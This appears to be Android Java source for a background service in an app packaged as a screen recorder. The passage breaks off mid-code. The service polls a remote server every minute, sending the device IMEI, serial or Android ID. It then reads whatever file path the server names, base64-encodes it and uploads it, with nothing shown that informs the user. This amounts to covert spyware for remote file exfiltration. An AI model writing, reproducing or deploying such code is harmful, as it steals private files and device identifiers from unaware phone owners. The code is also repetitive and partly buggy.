package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class FileUpload extends Service {
    String outputfile = "";
    Timer mytimer;

    public static boolean  running =false;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        running = true;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        running = true;
        mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- FileUpload");
                makeGetRequest();
            }
        },1000,60500);//change Timer Value
        return super.onStartCommand(intent, flags, startId);
    }

    private void makeGetRequest() {
        String result = "";
        InputStream inputStream = null;
        HttpClient httpclient = new DefaultHttpClient();
        String upld = UrlDemo.fileUpld;
        HttpPost httppost = new HttpPost(upld);

        TelephonyManager tm =(TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        byte[] imeiFilupload = imei.getBytes();
        String imeibaseFilupload = android.util.Base64.encodeToString(imeiFilupload, android.util.Base64.DEFAULT);
        String imeibaseFiluploadstring = imeibaseFilupload.replaceAll("\n", "");

        String serial = android.os.Build.SERIAL;
        byte[] serialFilupload= serial.getBytes();
        String serialbaseFilupload = android.util.Base64.encodeToString(serialFilupload, android.util.Base64.DEFAULT);
        String serialbaseFiluploadstring = serialbaseFilupload.replaceAll("\n", "");

        String uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        byte[] uidFilupload = uid.getBytes();
        String uidbaseFilupload = android.util.Base64.encodeToString(uidFilupload, android.util.Base64.DEFAULT);
        String uidbaseFiluploadstring = uidbaseFilupload.replaceAll("\n", "");

        SharedPreferences sp = getSharedPreferences("key", 0);
        String tValue = sp.getString("chkfileupload","");

        ConnectivityManager connectivity;
        NetworkInfo wifiInfo;
        connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")){
            try{

                String base64encoded_filedata = "";
                if(imei != null){
                    System.out.println("IMEI NUll not null fileupload = ");
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                    nameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseFiluploadstring));
                    httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                    HttpResponse response = httpclient.execute(httppost);
                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    inputStream = entity.getContent();
                    String buffer = "";
                    for (int i = inputStream.read(); i != -1; i = inputStream.read()) {
                        buffer += (char) i;
                        i++;
                    }
                    System.out.println("UploadBuffer = = " + buffer);

                    // Receiving side
                    byte[] data = Base64.decode(buffer, Base64.DEFAULT);
                    String text = new String(data, "UTF-8");
                    System.out.println("Decodedata = " +text);

                    //POST FILE
                    if(text.startsWith("1")) {
                        Clear();
                        String[] filesplit = text.split (",");
                        String filepath =filesplit[1].toString();
                        String filename= filepath.substring(filepath.lastIndexOf("/") + 1);
                        System.out.println("fileDirectory == " +filepath);
                        System.out.println("fileName == " +filename);

                        byte[] namedata = filename.getBytes("UTF-8");
                        String filenameencode = Base64.encodeToString(namedata, Base64.DEFAULT);
                        String  string = filenameencode.replaceAll("\n", "");

                        System.out.println("fileName == " +string);


                        for (String s : filesplit) {
                            s = s.substring(s.indexOf(",")+1);
                            System.out.println("File Split == " +s);
                        }


                        File file = new File(filepath);
                        int size = (int) file.length();
                        if (file.exists() && size>0 ){
                            System.out.println("file Exist");
                            Log.i("TestSize","TestSize"+size);
                            byte[] bytesdata = new byte[size];

               /* int size = (int) file.length();
                Log.i("TestSize","TestSize"+size);
                byte[] bytesdata = new byte[size];*/

                            try {

                                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(filepath));
                                buf.read(bytesdata,0,bytesdata.length);
                                buf.close();
                                Log.i("bytelength","length"+bytesdata.length);

                                String filedata = android.util.Base64.encodeToString(bytesdata, android.util.Base64.NO_WRAP);

                                InputStream Fileinputstream = null;
                                HttpClient Filehttpclient = new DefaultHttpClient();
                                String fupload = UrlDemo.fupload;
                                HttpPost filehttpPost = new HttpPost(fupload);
                                try {
                                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
                                    nameValuePair.add(new BasicNameValuePair("IMEI", imeibaseFiluploadstring));
                                    nameValuePair.add(new BasicNameValuePair("DATA",filedata));
                                    nameValuePair.add(new BasicNameValuePair("FNAME",string));

                                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                                    HttpResponse fileresponse = Filehttpclient.execute(filehttpPost);
                                    fileresponse.getStatusLine();

                                    HttpEntity filehttpEntity = fileresponse.getEntity();
                                    Fileinputstream = filehttpEntity.getContent();
                                    String Filetext = "";
                                    for (int i = Fileinputstream.read(); i != -1; i = Fileinputstream.read()) {
                                        Filetext += (char) i;
                                        i++;
                                    }
                                    System.out.println("Fupload = " + Filetext);
                                    //delete file
                                    if (Filetext.equals("OK") ){
                                        InputStream deleteinputStream = null;
                                        HttpClient deletehttpclient = new DefaultHttpClient();
                                        String clr = UrlDemo.fileClear;
                                        HttpPost deletehttppost = new HttpPost(clr);
                                        try {
                                            //   TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                            List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                            deletenameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseFiluploadstring));
                                            deletenameValuePairs.add(new BasicNameValuePair("action", "CLR"));

                                            deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                            HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                            deleteresponse.getStatusLine();

                                            HttpEntity deleteentity = response.getEntity();
                                            deleteentity = response.getEntity();

                                            deleteinputStream = deleteentity.getContent();
                                            String deletebuffer = "";
                                            for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                                deletebuffer += (char) i;
                                                i++;
                                            }
                                            System.out.println("deletfile == " + deletebuffer);
                                        }
                                        catch (Exception e){
                                            System.out.println("Exception delete == " +e);

                                        }
                                    }
                                    else {
                                        System.out.println("file not deleted");
                                    }
                                    //delete file on server end

                                    System.out.println("Fileresponse " +Filetext);
                                }

                                catch (IOException e) {
                                    System.out.println("Catch Exception " +e);
                                    e.printStackTrace();
                                }
                            }//try block fupload
                            catch (FileNotFoundException e){
                                e.printStackTrace();
                            }
                            catch (IOException e){
                                e.printStackTrace();
                            }
                        }//if(file.exist()) end

                        else {
                            InputStream deleteinputStream = null;
                            HttpClient deletehttpclient = new DefaultHttpClient();
                            String nfd = UrlDemo.filenotfound;
                            HttpPost deletehttppost = new HttpPost(nfd);
                            try {
                                // TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                deletenameValuePairs.add(new BasicNameValuePair("IMEI",imeibaseFiluploadstring));
                                deletenameValuePairs.add(new BasicNameValuePair("NFD", string));

                                deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                deleteresponse.getStatusLine();

                                HttpEntity deleteentity = response.getEntity();
                                deleteentity = response.getEntity();

                                deleteinputStream = deleteentity.getContent();
                                String deletebuffer = "";
                                for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                    deletebuffer += (char) i;
                                    i++;
                                }
                                System.out.println("Chkdeletfile == " + deletebuffer);
                            }
                            catch (Exception e){
                                System.out.println("ChkException delete == " +e);
                            }

                            System.out.println("Chk File Not Found");
                        }

                        System.out.println("File send == ");
                    }//if(response stratwith 1 end)
                    else {
                        System.out.println("Request Error == ");
                    }

                    Log.d("Test","Response of Upload = " +buffer);
                }
                else if (serial != null){
                    System.out.println("IMEI NUll && serial no not fileupload = ");
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                    nameValuePairs.add(new BasicNameValuePair("IMEI", serialbaseFiluploadstring));
                    httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                    HttpResponse response = httpclient.execute(httppost);
                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    inputStream = entity.getContent();
                    String buffer = "";
                    for (int i = inputStream.read(); i != -1; i = inputStream.read()) {
                        buffer += (char) i;
                        i++;
                    }
                    System.out.println("UploadBuffer = = " + buffer);

                    // Receiving side

                    byte[] data = Base64.decode(buffer, Base64.DEFAULT);
                    String text = new String(data, "UTF-8");
                    System.out.println("Decodedata = " +text);


                    //POST FILE
                    if(text.startsWith("1")) {
                        String[] filesplit = text.split (",");
                        String filepath =filesplit[1].toString();
                        String filename= filepath.substring(filepath.lastIndexOf("/") + 1);
                        System.out.println("fileDirectory == " +filepath);
                        System.out.println("fileName == " +filename);

                        byte[] namedata = filename.getBytes("UTF-8");
                        String filenameencode = Base64.encodeToString(namedata, Base64.DEFAULT);
                        String  string = filenameencode.replaceAll("\n", "");

                        System.out.println("fileName == " +string);


                        for (String s : filesplit) {
                            s = s.substring(s.indexOf(",")+1);
                            System.out.println("File Split == " +s);
                        }


                        File file = new File(filepath);
                        int size = (int) file.length();
                        if (file.exists() && size>0 ){
                            System.out.println("file Exist");
                            Log.i("TestSize","TestSize"+size);
                            byte[] bytesdata = new byte[size];

               /* int size = (int) file.length();
                Log.i("TestSize","TestSize"+size);
                byte[] bytesdata = new byte[size];*/

                            try {

                                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(filepath));
                                buf.read(bytesdata,0,bytesdata.length);
                                buf.close();

                                Log.i("bytelength","length"+bytesdata.length);
                                String filedata = android.util.Base64.encodeToString(bytesdata, android.util.Base64.NO_WRAP);
                                Log.i("Test ","Filedata == " +filedata);
                                InputStream Fileinputstream = null;
                                HttpClient Filehttpclient = new DefaultHttpClient();
                                String fupload = UrlDemo.fupload;
                                HttpPost filehttpPost = new HttpPost(fupload);
                                try {

                                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
                                    nameValuePair.add(new BasicNameValuePair("IMEI", serialbaseFiluploadstring));
                                    nameValuePair.add(new BasicNameValuePair("DATA",filedata));
                                    nameValuePair.add(new BasicNameValuePair("FNAME",string));

                                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                                    HttpResponse fileresponse = Filehttpclient.execute(filehttpPost);
                                    fileresponse.getStatusLine();

                                    HttpEntity filehttpEntity = fileresponse.getEntity();
                                    Fileinputstream = filehttpEntity.getContent();
                                    String Filetext = "";
                                    for (int i = Fileinputstream.read(); i != -1; i = Fileinputstream.read()) {
                                        Filetext += (char) i;
                                        i++;
                                    }
                                    System.out.println("Fupload = " + Filetext);
                                    //delete file
                                    if (Filetext.equals("OK") ){
                                        InputStream deleteinputStream = null;
                                        HttpClient deletehttpclient = new DefaultHttpClient();
                                        String clr = UrlDemo.fileClear;
                                        HttpPost deletehttppost = new HttpPost(clr);
                                        try {
                                            //   TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                            List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                            deletenameValuePairs.add(new BasicNameValuePair("IMEI", serialbaseFiluploadstring));
                                            deletenameValuePairs.add(new BasicNameValuePair("action", "CLR"));

                                            deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                            HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                            deleteresponse.getStatusLine();

                                            HttpEntity deleteentity = response.getEntity();
                                            deleteentity = response.getEntity();

                                            deleteinputStream = deleteentity.getContent();
                                            String deletebuffer = "";
                                            for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                                deletebuffer += (char) i;
                                                i++;
                                            }
                                            System.out.println("deletfile == " + deletebuffer);
                                        }
                                        catch (Exception e){
                                            System.out.println("Exception delete == " +e);

                                        }
                                    }
                                    else {
                                        System.out.println("file not deleted");
                                    }
                                    //delete file on server end

                                    System.out.println("Fileresponse " +Filetext);
                                }

                                catch (IOException e) {
                                    System.out.println("Catch Exception " +e);
                                    e.printStackTrace();
                                }
                            }//try block fupload
                            catch (FileNotFoundException e){
                                e.printStackTrace();
                            }
                            catch (IOException e){
                                e.printStackTrace();
                            }
                        }//if(file.exist()) end

                        else {
                            InputStream deleteinputStream = null;
                            HttpClient deletehttpclient = new DefaultHttpClient();
                            String nfd = UrlDemo.filenotfound;
                            HttpPost deletehttppost = new HttpPost(nfd);
                            try {
                                // TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                deletenameValuePairs.add(new BasicNameValuePair("IMEI",serialbaseFiluploadstring));
                                deletenameValuePairs.add(new BasicNameValuePair("NFD", string));

                                deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                deleteresponse.getStatusLine();

                                HttpEntity deleteentity = response.getEntity();
                                deleteentity = response.getEntity();

                                deleteinputStream = deleteentity.getContent();
                                String deletebuffer = "";
                                for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                    deletebuffer += (char) i;
                                    i++;
                                }
                                System.out.println("Chkdeletfile == " + deletebuffer);
                            }
                            catch (Exception e){
                                System.out.println("ChkException delete == " +e);
                            }

                            System.out.println("Chk File Not Found");
                        }

                        System.out.println("File send == ");
                    }//if(response stratwith 1 end)
                    else {
                        System.out.println("Request Error == ");
                    }

                    Log.d("Test","Response of Upload = " +buffer);
                }
                else {
                    System.out.println("IMEI NUll && serial no null && Android Id not null fileuplaod = ");
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                    nameValuePairs.add(new BasicNameValuePair("IMEI", uidbaseFiluploadstring));
                    httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                    HttpResponse response = httpclient.execute(httppost);
                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    inputStream = entity.getContent();
                    String buffer = "";
                    for (int i = inputStream.read(); i != -1; i = inputStream.read()) {
                        buffer += (char) i;
                        i++;
                    }
                    System.out.println("UploadBuffer = = " + buffer);

                    // Receiving side

                    byte[] data = Base64.decode(buffer, Base64.DEFAULT);
                    String text = new String(data, "UTF-8");
                    System.out.println("Decodedata = " +text);


                    //POST FILE
                    if(text.startsWith("1")) {
                        String[] filesplit = text.split (",");
                        String filepath =filesplit[1].toString();
                        String filename= filepath.substring(filepath.lastIndexOf("/") + 1);
                        System.out.println("fileDirectory == " +filepath);
                        System.out.println("fileName == " +filename);

                        byte[] namedata = filename.getBytes("UTF-8");
                        String filenameencode = Base64.encodeToString(namedata, Base64.DEFAULT);
                        String  string = filenameencode.replaceAll("\n", "");

                        System.out.println("fileName == " +string);


                        for (String s : filesplit) {
                            s = s.substring(s.indexOf(",")+1);
                            System.out.println("File Split == " +s);
                        }


                        File file = new File(filepath);
                        int size = (int) file.length();
                        if (file.exists() && size>0 ){
                            System.out.println("file Exist");
                            Log.i("TestSize","TestSize"+size);
                            byte[] bytesdata = new byte[size];

               /* int size = (int) file.length();
                Log.i("TestSize","TestSize"+size);
                byte[] bytesdata = new byte[size];*/

                            try {

                                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(filepath));
                                buf.read(bytesdata,0,bytesdata.length);
                                buf.close();

                                Log.i("bytelength","length"+bytesdata.length);
                                String filedata = android.util.Base64.encodeToString(bytesdata, android.util.Base64.NO_WRAP);
                                Log.i("Test ","Filedata == " +filedata);

                                // Receiving side
                   /* byte[] data = Base64.decode(filedata, Base64.DEFAULT);
                    String text = new String(data, "UTF-8");*/

                                InputStream Fileinputstream = null;
                                HttpClient Filehttpclient = new DefaultHttpClient();
                                String fupload = UrlDemo.fupload;
                                HttpPost filehttpPost = new HttpPost(fupload);
                                try {
                       /* TelephonyManager tm1 = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
                        String imei = tm1.getDeviceId();*/


                                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
                                    nameValuePair.add(new BasicNameValuePair("IMEI", uidbaseFiluploadstring));
                                    nameValuePair.add(new BasicNameValuePair("DATA",filedata));
                                    nameValuePair.add(new BasicNameValuePair("FNAME",string));

                                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                                    HttpResponse fileresponse = Filehttpclient.execute(filehttpPost);
                                    fileresponse.getStatusLine();

                                    HttpEntity filehttpEntity = fileresponse.getEntity();
                                    Fileinputstream = filehttpEntity.getContent();
                                    String Filetext = "";
                                    for (int i = Fileinputstream.read(); i != -1; i = Fileinputstream.read()) {
                                        Filetext += (char) i;
                                        i++;
                                    }
                                    System.out.println("Fupload = " + Filetext);
                                    //delete file
                                    if (Filetext.equals("OK") ){
                                        InputStream deleteinputStream = null;
                                        HttpClient deletehttpclient = new DefaultHttpClient();
                                        String clr = UrlDemo.fileClear;
                                        HttpPost deletehttppost = new HttpPost(clr);
                                        try {
                                            //   TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                            List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                            deletenameValuePairs.add(new BasicNameValuePair("IMEI", uidbaseFiluploadstring));
                                            deletenameValuePairs.add(new BasicNameValuePair("action", "CLR"));

                                            deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                            HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                            deleteresponse.getStatusLine();

                                            HttpEntity deleteentity = response.getEntity();
                                            deleteentity = response.getEntity();

                                            deleteinputStream = deleteentity.getContent();
                                            String deletebuffer = "";
                                            for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                                deletebuffer += (char) i;
                                                i++;
                                            }
                                            System.out.println("deletfile == " + deletebuffer);
                                        }
                                        catch (Exception e){
                                            System.out.println("Exception delete == " +e);

                                        }
                                    }
                                    else {
                                        System.out.println("file not deleted");
                                    }
                                    //delete file on server end

                                    System.out.println("Fileresponse " +Filetext);
                                }

                                catch (IOException e) {
                                    System.out.println("Catch Exception " +e);
                                    e.printStackTrace();
                                }
                            }//try block fupload
                            catch (FileNotFoundException e){
                                e.printStackTrace();
                            }
                            catch (IOException e){
                                e.printStackTrace();
                            }
                        }//if(file.exist()) end

                        else {
                            InputStream deleteinputStream = null;
                            HttpClient deletehttpclient = new DefaultHttpClient();
                            String nfd = UrlDemo.filenotfound;
                            HttpPost deletehttppost = new HttpPost(nfd);
                            try {
                                // TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                deletenameValuePairs.add(new BasicNameValuePair("IMEI",uidbaseFiluploadstring));
                                deletenameValuePairs.add(new BasicNameValuePair("NFD", string));

                                deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                deleteresponse.getStatusLine();

                                HttpEntity deleteentity = response.getEntity();
                                deleteentity = response.getEntity();

                                deleteinputStream = deleteentity.getContent();
                                String deletebuffer = "";
                                for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                    deletebuffer += (char) i;
                                    i++;
                                }
                                System.out.println("Chkdeletfile == " + deletebuffer);
                            }
                            catch (Exception e){
                                System.out.println("ChkException delete == " +e);
                            }

                            System.out.println("Chk File Not Found");
                        }

                        System.out.println("File send == ");
                    }//if(response stratwith 1 end)
                    else {
                        System.out.println("Request Error == ");
                    }

                    Log.d("Test","Response of Upload = " +buffer);
                }
            }
            catch(Exception e){
            }
        }
        else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")){
            try{


                //   TelephonyManager tm =(TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                String base64encoded_filedata = "";
                if(imei != null){
                    System.out.println("IMEI NUll not null fileupload = ");
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                    nameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseFiluploadstring));
                    httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                    HttpResponse response = httpclient.execute(httppost);
                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    inputStream = entity.getContent();
                    String buffer = "";
                    for (int i = inputStream.read(); i != -1; i = inputStream.read()) {
                        buffer += (char) i;
                        i++;
                    }
                    System.out.println("UploadBuffer = = " + buffer);

                    // Receiving side
                    byte[] data = Base64.decode(buffer, Base64.DEFAULT);
                    String text = new String(data, "UTF-8");
                    System.out.println("Decodedata = " +text);

                    //POST FILE
                    if(text.startsWith("1")) {
                        Clear();
                        String[] filesplit = text.split (",");
                        String filepath =filesplit[1].toString();
                        String filename= filepath.substring(filepath.lastIndexOf("/") + 1);
                        System.out.println("fileDirectory == " +filepath);
                        System.out.println("fileName == " +filename);

                        byte[] namedata = filename.getBytes("UTF-8");
                        String filenameencode = Base64.encodeToString(namedata, Base64.DEFAULT);
                        String  string = filenameencode.replaceAll("\n", "");

                        System.out.println("fileName == " +string);


                        for (String s : filesplit) {
                            s = s.substring(s.indexOf(",")+1);
                            System.out.println("File Split == " +s);
                        }


                        File file = new File(filepath);
                        int size = (int) file.length();
                        if (file.exists() && size>0 ){
                            System.out.println("file Exist");
                            Log.i("TestSize","TestSize"+size);
                            byte[] bytesdata = new byte[size];

               /* int size = (int) file.length();
                Log.i("TestSize","TestSize"+size);
                byte[] bytesdata = new byte[size];*/

                            try {

                                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(filepath));
                                buf.read(bytesdata,0,bytesdata.length);
                                buf.close();
                                Log.i("bytelength","length"+bytesdata.length);

                                String filedata = android.util.Base64.encodeToString(bytesdata, android.util.Base64.NO_WRAP);

                                InputStream Fileinputstream = null;
                                HttpClient Filehttpclient = new DefaultHttpClient();
                                String fupload = UrlDemo.fupload;
                                HttpPost filehttpPost = new HttpPost(fupload);
                                try {
                                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
                                    nameValuePair.add(new BasicNameValuePair("IMEI", imeibaseFiluploadstring));
                                    nameValuePair.add(new BasicNameValuePair("DATA",filedata));
                                    nameValuePair.add(new BasicNameValuePair("FNAME",string));

                                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                                    HttpResponse fileresponse = Filehttpclient.execute(filehttpPost);
                                    fileresponse.getStatusLine();

                                    HttpEntity filehttpEntity = fileresponse.getEntity();
                                    Fileinputstream = filehttpEntity.getContent();
                                    String Filetext = "";
                                    for (int i = Fileinputstream.read(); i != -1; i = Fileinputstream.read()) {
                                        Filetext += (char) i;
                                        i++;
                                    }
                                    System.out.println("Fupload = " + Filetext);
                                    //delete file
                                    if (Filetext.equals("OK") ){
                                        InputStream deleteinputStream = null;
                                        HttpClient deletehttpclient = new DefaultHttpClient();
                                        String clr = UrlDemo.fileClear;
                                        HttpPost deletehttppost = new HttpPost(clr);
                                        try {
                                            //   TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                            List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                            deletenameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseFiluploadstring));
                                            deletenameValuePairs.add(new BasicNameValuePair("action", "CLR"));

                                            deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                            HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                            deleteresponse.getStatusLine();

                                            HttpEntity deleteentity = response.getEntity();
                                            deleteentity = response.getEntity();

                                            deleteinputStream = deleteentity.getContent();
                                            String deletebuffer = "";
                                            for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                                deletebuffer += (char) i;
                                                i++;
                                            }
                                            System.out.println("deletfile == " + deletebuffer);
                                        }
                                        catch (Exception e){
                                            System.out.println("Exception delete == " +e);

                                        }
                                    }
                                    else {
                                        System.out.println("file not deleted");
                                    }
                                    //delete file on server end

                                    System.out.println("Fileresponse " +Filetext);
                                }

                                catch (IOException e) {
                                    System.out.println("Catch Exception " +e);
                                    e.printStackTrace();
                                }
                            }//try block fupload
                            catch (FileNotFoundException e){
                                e.printStackTrace();
                            }
                            catch (IOException e){
                                e.printStackTrace();
                            }
                        }//if(file.exist()) end

                        else {
                            InputStream deleteinputStream = null;
                            HttpClient deletehttpclient = new DefaultHttpClient();
                            String nfd = UrlDemo.filenotfound;
                            HttpPost deletehttppost = new HttpPost(nfd);
                            try {
                                // TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                deletenameValuePairs.add(new BasicNameValuePair("IMEI",imeibaseFiluploadstring));
                                deletenameValuePairs.add(new BasicNameValuePair("NFD", string));

                                deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                deleteresponse.getStatusLine();

                                HttpEntity deleteentity = response.getEntity();
                                deleteentity = response.getEntity();

                                deleteinputStream = deleteentity.getContent();
                                String deletebuffer = "";
                                for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                    deletebuffer += (char) i;
                                    i++;
                                }
                                System.out.println("Chkdeletfile == " + deletebuffer);
                            }
                            catch (Exception e){
                                System.out.println("ChkException delete == " +e);
                            }

                            System.out.println("Chk File Not Found");
                        }

                        System.out.println("File send == ");
                    }//if(response stratwith 1 end)
                    else {
                        System.out.println("Request Error == ");
                    }

                    Log.d("Test","Response of Upload = " +buffer);
                }
                else if (serial != null){
                    System.out.println("IMEI NUll && serial no not fileupload = ");
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                    nameValuePairs.add(new BasicNameValuePair("IMEI", serialbaseFiluploadstring));
                    httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                    HttpResponse response = httpclient.execute(httppost);
                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    inputStream = entity.getContent();
                    String buffer = "";
                    for (int i = inputStream.read(); i != -1; i = inputStream.read()) {
                        buffer += (char) i;
                        i++;
                    }
                    System.out.println("UploadBuffer = = " + buffer);

                    // Receiving side

                    byte[] data = Base64.decode(buffer, Base64.DEFAULT);
                    String text = new String(data, "UTF-8");
                    System.out.println("Decodedata = " +text);


                    //POST FILE
                    if(text.startsWith("1")) {
                        String[] filesplit = text.split (",");
                        String filepath =filesplit[1].toString();
                        String filename= filepath.substring(filepath.lastIndexOf("/") + 1);
                        System.out.println("fileDirectory == " +filepath);
                        System.out.println("fileName == " +filename);

                        byte[] namedata = filename.getBytes("UTF-8");
                        String filenameencode = Base64.encodeToString(namedata, Base64.DEFAULT);
                        String  string = filenameencode.replaceAll("\n", "");

                        System.out.println("fileName == " +string);


                        for (String s : filesplit) {
                            s = s.substring(s.indexOf(",")+1);
                            System.out.println("File Split == " +s);
                        }


                        File file = new File(filepath);
                        int size = (int) file.length();
                        if (file.exists() && size>0 ){
                            System.out.println("file Exist");
                            Log.i("TestSize","TestSize"+size);
                            byte[] bytesdata = new byte[size];

               /* int size = (int) file.length();
                Log.i("TestSize","TestSize"+size);
                byte[] bytesdata = new byte[size];*/

                            try {

                                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(filepath));
                                buf.read(bytesdata,0,bytesdata.length);
                                buf.close();

                                Log.i("bytelength","length"+bytesdata.length);
                                String filedata = android.util.Base64.encodeToString(bytesdata, android.util.Base64.NO_WRAP);
                                Log.i("Test ","Filedata == " +filedata);
                                InputStream Fileinputstream = null;
                                HttpClient Filehttpclient = new DefaultHttpClient();
                                String fupload = UrlDemo.fupload;
                                HttpPost filehttpPost = new HttpPost(fupload);
                                try {

                                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
                                    nameValuePair.add(new BasicNameValuePair("IMEI", serialbaseFiluploadstring));
                                    nameValuePair.add(new BasicNameValuePair("DATA",filedata));
                                    nameValuePair.add(new BasicNameValuePair("FNAME",string));

                                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                                    HttpResponse fileresponse = Filehttpclient.execute(filehttpPost);
                                    fileresponse.getStatusLine();

